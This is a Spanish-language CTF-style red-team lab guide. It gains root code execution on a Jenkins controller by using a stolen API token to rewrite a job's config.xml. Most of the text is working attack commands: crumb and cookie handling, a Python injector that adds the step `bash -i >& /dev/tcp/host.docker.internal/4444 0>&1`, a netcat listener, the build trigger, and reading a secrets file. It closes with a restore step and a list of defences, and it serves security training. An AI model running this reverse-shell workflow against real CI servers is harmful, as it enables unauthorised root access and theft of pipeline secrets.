# 10 - RCE modificando un job (`update-job`)

**Clase 3 · 30 min · M4 Jenkins Demo 04**
**Fase:** ejecucion remota en el runner
**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1078 (Valid Accounts)
**Riesgo OWASP CI/CD:** CICD-SEC-1 (control de flujo), CICD-SEC-4 (pipeline envenenado)

## Escenario

El token del lab 09 tiene permiso para leer y escribir la configuracion de los
jobs. No hace falta un CVE: puedes reescribir `config.xml`, anadir un step de
shell y lanzar el build. El codigo se ejecuta en el mismo contenedor que Jenkins,
como root.

En un engagement esto se usa cuando ya tienes una credencial de CI pero no una
shell. Es el puente entre "token" y "RCE".

Los CVEs de Jenkins de 2026 llegan al mismo sitio sin este token:
CVE-2026-84645 (RCE por objetos anidados en `config.xml`) y CVE-2026-33001
(archivos `.tar` con symlinks que escriben fuera del workspace). La causa
cambia; el resultado, ejecucion con la identidad del controlador, no.

## Objetivo de aprendizaje

- Descargar y modificar la configuracion XML de un job.
- Entender los dos errores tipicos: XML mal escapado y crumb sin cookie.
- Adaptar el shell al usuario que ejecuta el step (`/bin/sh`, no bash).
- Recibir la conexion en el host.

## Antes de empezar

```bash
cd devops-redteam
source <(sed -n 's/^\(JENKINS_[A-Z]*\)=\(.*\)/export \1="\2"/p' seed/repo/secrets/jenkins_token.txt)
export J=http://localhost:8080
CRUMB=$(curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" -c /tmp/jc10 \
  $J/crumbIssuer/api/json | python3 -c 'import sys,json;print(json.load(sys.stdin)["crumb"])')
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" $J/job/prod-deploy/config.xml -o /tmp/job.xml
grep -c '<builders>' /tmp/job.xml
```

**Que esperar:** `1`. Si es `0`, el job usa otro formato y tendrias que mirar el
XML antes de inyectar.

## Paso 1 - Inyectar el step (con escape correcto)

El XML no admite `&` sin escapar. Un `bash -i >& /dev/tcp/...` crudo produce un
XML invalido y Jenkins responde `500`. Hay dos detalles mas:

- El step lo ejecuta `/bin/sh` (dash), que no entiende `/dev/tcp`. Hay que
  envolverlo en `bash -c '...'` para que las redirecciones las parsee bash.
- El POST necesita la cookie de sesion (`-b`), no solo el crumb.

```bash
python3 - <<'PY'
from xml.dom import minidom
from xml.sax.saxutils import escape

xml = open('/tmp/job.xml').read()
cmd = "bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'"
step = "<hudson.tasks.Shell><command>" + escape(cmd) + "</command></hudson.tasks.Shell>"
assert '<builders>' in xml
xml = xml.replace('<builders>', '<builders>' + step, 1)
minidom.parseString(xml)          # falla aqui si el XML no es valido
open('/tmp/job2.xml', 'w').write(xml)
print('xml ok')
PY
```

**Que esperar:** `xml ok`.

## Paso 2 - Subir la configuracion

```bash
curl -s -o /dev/null -w 'update %{http_code}\n' \
  -u "$JENKINS_USER:$JENKINS_TOKEN" -b /tmp/jc10 \
  -H "Jenkins-Crumb: $CRUMB" -H 'Content-Type: application/xml' \
  --data-binary @/tmp/job2.xml -X POST $J/job/prod-deploy/config.xml
```

**Que esperar:** `200`. Si ves `500`, el crumb no coincide con la cookie o el
XML esta mal; si ves `403`, el token no tiene permiso de escritura.

## Paso 3 - Escuchar y lanzar

Terminal 1:

```bash
nc -lvnp 4444
```

Terminal 2:

```bash
source <(sed -n 's/^\(JENKINS_[A-Z]*\)=\(.*\)/export \1="\2"/p' /home/ponciop/devops-redteam/seed/repo/secrets/jenkins_token.txt)
curl -s -o /dev/null -w 'build %{http_code}\n' \
  -u "$JENKINS_USER:$JENKINS_TOKEN" -b /tmp/jc10 \
  -H "Jenkins-Crumb: $CRUMB" -X POST http://localhost:8080/job/prod-deploy/build
```

**Que esperar:** en la terminal 1, una shell root. Dentro:

```bash
id
hostname
cat /var/jenkins_home/secrets/flag-rce.txt
```

**Que esperar:** `uid=0(root)` y `FLAG{jenkins_update_job_rce}`.

**Por que `host.docker.internal`:** el compose define
`extra_hosts: host.docker.internal:host-gateway`, asi que el contenedor resuelve
la IP del host. Sin eso, tendrias que usar la IP del bridge (`172.17.0.1`).

## Paso 4 - Restaurar el job

No dejes el backdoor:

```bash
CRUMB=$(curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" -c /tmp/jc10b \
  http://localhost:8080/crumbIssuer/api/json \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["crumb"])')
curl -s -o /dev/null -w 'restore %{http_code}\n' \
  -u "$JENKINS_USER:$JENKINS_TOKEN" -b /tmp/jc10b \
  -H "Jenkins-Crumb: $CRUMB" -H 'Content-Type: application/xml' \
  --data-binary @/tmp/job.xml -X POST http://localhost:8080/job/prod-deploy/config.xml
```

## Paso 5 - Alternativa con CLI (opcional)

```bash
java -jar /tmp/jenkins-cli.jar -s http://localhost:8080 \
  -auth "$JENKINS_USER:$JENKINS_TOKEN" update-job prod-deploy < /tmp/job2.xml
```

## Evidencia para el informe

- XML original y modificado (diff del step).
- Codigo `200` del POST y numero de build.
- Captura de `id`, `hostname` y flag.
- Ruta del archivo sensible (`/var/jenkins_home/secrets/flag-rce.txt`).

## Checkpoint

1. Por que el step corre como root y que implica para el host?
2. Que dos ajustes hacen falta para que el shell funcione (XML y shell)?
3. Que control habria impedido el POST aunque el token se filtrara?

## Defensa

- Tokens de solo lectura para automatizacion; escritura solo desde CI de confianza.
- Job DSL/seed controlado por PR, no configuracion editable por cualquiera.
- Alertar de cambios en `config.xml` fuera del pipeline.
- Egress filtering del runner: una reverse shell a internet no deberia salir.
- Agentes efimeros y sin acceso al `JENKINS_HOME` del master.
